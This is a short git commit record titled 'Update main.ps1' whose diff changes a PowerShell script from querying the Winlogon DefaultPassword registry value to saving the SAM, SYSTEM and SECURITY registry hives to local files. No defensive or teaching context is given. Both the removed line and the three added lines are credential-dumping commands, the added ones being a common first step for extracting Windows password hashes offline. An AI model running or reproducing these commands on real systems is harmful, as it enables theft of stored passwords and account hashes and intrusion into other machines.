367ac3ec8d7dd37235b4e515a82cb932a586e2f4
winkira <kirahhkimmm@gmail.com>
2026-01-27 20:30:04 -0500

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -1,1 +1,3 @@
-reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+reg save HKLM\SAM sam.hive
+reg save HKLM\SYSTEM system.hive  
+reg save HKLM\SECURITY security.hive
